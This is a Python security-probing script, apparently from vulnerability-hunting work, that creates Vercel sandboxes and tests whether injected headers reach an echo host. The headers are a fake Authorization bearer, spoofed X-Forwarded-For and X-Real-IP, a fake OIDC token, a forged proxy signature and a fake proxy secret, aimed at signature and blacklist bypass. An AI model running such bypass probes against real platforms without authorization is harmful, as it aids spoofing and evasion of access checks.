# -*- coding: utf-8 -*-
"""非传统面L4: injectionRules 关键头补测
① Authorization 注入 (到达目标?)
② X-Forwarded-For / X-Real-IP 注入
③ X-Vercel-OIDC-Token 覆盖 (注入 FAKE 是否覆盖真实 OIDC)
④ x-vercel-proxy-signature 伪造 (自动签名头能否被注入覆盖 → 代理校验绕过?)
⑤ 大写/变体头名绕过黑名单 (x-api-key vs X-API-Key vs Api-Key)
"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

def log(s): print(s, flush=True)

def parse_data(r):
    out = ''
    for line in (r or '').splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

ECHO = 'sbx-echo-e29ca9cb.vercel.app'

def mk_sandbox(name, headers):
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (name, TEAM, PROJ))
    time.sleep(2)
    c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, {
        "projectId": PROJ, "name": name,
        "networkPolicy": {"mode": "custom", "allowedDomains": [ECHO],
                          "injectionRules": [{"domain": ECHO, "headers": headers}]},
    }, 60)
    log('[create %s] -> %s | %s' % (name, c, (r or '')[:160].replace(chr(10), ' ')))
    if c != 200:
        return None
    return json.loads(r)['sandbox']['currentSessionId']

def probe(sid, tag):
    c3, r3 = api("POST", "/v2/sandboxes/sessions/%s/cmd?teamId=%s" % (sid, TEAM),
                 {"command": "sh", "args": ["-c",
                  "curl -s -m 10 https://%s/ > /tmp/h.txt 2>&1; cat /tmp/h.txt" % ECHO],
                  "wait": True, "timeout": 20000, "logs": True}, 35)
    out = parse_data(r3)
    log('[%s] -> %s' % (tag, out[:700].replace(chr(10), ' ')))

TESTS = [
    ('auth', {'Authorization': 'Bearer FAKE123'}),
    ('xff', {'X-Forwarded-For': '6.6.6.6'}),
    ('xrip', {'X-Real-IP': '9.9.9.9'}),
    ('oidc-over', {'X-Vercel-OIDC-Token': 'FAKE_OIDC'}),
    ('sig-forge', {'x-vercel-proxy-signature': 'Bearer FAKESIG'}),
    ('secret', {'x-vercel-proxy-secret': 'FAKESECRET'}),
]

for tag, hdrs in TESTS:
    sid = mk_sandbox('l34', hdrs)
    if not sid:
        time.sleep(3)
        continue
    time.sleep(3)
    probe(sid, tag)
    api("DELETE", "/v2/sandboxes/l34?teamId=%s&projectId=%s" % (TEAM, PROJ))
    time.sleep(2)

log('DONE')
